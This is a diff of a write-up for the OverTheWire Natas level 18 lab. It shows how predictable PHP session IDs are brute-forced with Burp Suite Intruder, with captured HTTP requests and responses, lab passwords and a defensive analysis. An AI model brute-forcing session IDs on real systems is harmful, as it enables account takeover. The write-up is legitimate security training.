@@ -2288,7 +2288,7 @@ URL: http://natas18.natas.labs.overthewire.org
 Username: natas18
 Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 ```
-After login, the webpage displayed username and password input field and login button. 
+After login, the webpage displayed username and password input fields, along with a Login button.
 
 Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
@@ -2397,9 +2397,30 @@ Password: <input name="password"><br>
 ```
 
 ### Finding 
-find the admin php session 
-firstly, because of the phpsession has not been set as cookie, so just input anything and login. then refresh again, you will auto logged in as regular user (for my case). then, use the burpsuite to capture the request. then, can identified that the phpsession already been assigned... 
-request header content: 
+From the source code, the session mechanism has several weaknesses:
+
+1. Session ID is predictable
+   $maxid = 640;
+   return rand(1, $maxid);
+   - Session IDs are limited to values between 1 and 640
+
+2. Admin authentication is disabled
+   //return 1;
+   - Even if username = admin, admin access is never granted normally
+
+3. Session trust issue
+   if($_SESSION["admin"] == 1)
+   - The application trusts the session value without strong validation
+
+This indicates a Session Fixation / Session ID Brute Force vulnerability.
+
+
+### Approach 
+Step 1: Obtain a Valid Session
+Login with any credentials (e.g., username: admin; password: admin).
+
+Capture the request using Burp Suite:
+```http
 GET / HTTP/1.1
 Host: natas18.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -2412,14 +2433,31 @@ Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.
 Upgrade-Insecure-Requests: 1
 
 PHPSESSID=459
-then, because dont know what is the exact phpsessionid assigned for the admin, thus need to brute force the phpsession. 
+```
+This confirms: 
+- A session is created
+- Session ID is numeric
 
+**Note:** Please note that after login, need to refresh the page to capture through burpsuite. Else will not get the phpsessionid cause firstly login, the phpsessionid havent been assigned yet. 
 
-### Approach 
+Step 2: Identify Attack Surface
+Since:
+- Session IDs range from 1 to 640
+- Admin sessions must exist within this range
 
+We can brute force all possible session IDs.
 
-below is the content that have successfully captured. 
-request content
+Step 3: Brute Force Session IDs
+Using Burp Suite Intruder:
+Target: `Cookie: PHPSESSID=§1§`
+Payload settings:
+- Type: Numbers
+- Range: 1 → 640
+
+Step 4: Identify Valid Admin Session
+Below is the content that have successfully captured. 
+Request content: 
+```http
 GET / HTTP/1.1
 Host: natas18.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -2430,8 +2468,11 @@ Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==
 Connection: keep-alive
 Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=119
 Upgrade-Insecure-Requests: 1
+```
 
-response content
+
+Response content:
+```http
 HTTP/1.1 200 OK
 Date: Fri, 17 Apr 2026 15:37:57 GMT
 Server: Apache/2.4.58 (Ubuntu)
@@ -2462,11 +2503,37 @@ Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="in
 </div>
 </body>
 </html>
+```
 
+### Result
+The server returned:
+```
+You are an admin. The credentials for the next level are:
 
-
+Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+```
 
 ### Analysis
+This level demonstrates insecure session management:
+
+Vulnerabilities:
+- Predictable session IDs (rand(1,640))
+- Small session ID space → easy brute force
+- No session binding (IP/User-Agent not validated)
+- Trusting client-controlled session identifiers
+
+Attack Type:
+- Session ID brute force / session hijacking
+
+Impact:
+- Unauthorized privilege escalation to admin
+- Full access to protected credentials
+
+Session IDs must be:
+- Cryptographically secure (not predictable)
+- Large enough to prevent brute force
+- Properly validated and bound to user context
 
 ---
 
